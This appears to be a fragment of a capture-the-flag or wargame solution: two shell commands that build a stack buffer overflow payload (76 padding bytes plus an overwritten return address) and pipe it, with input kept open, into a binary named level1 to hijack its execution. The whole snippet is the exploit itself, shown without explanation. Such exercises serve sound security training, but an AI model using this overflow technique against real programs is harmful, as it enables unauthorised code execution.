```
$ python -c 'print("a" * 76 + "\x44\x84\x04\x08")' > /tmp/oob
$ cat /tmp/oob - | ./level1
```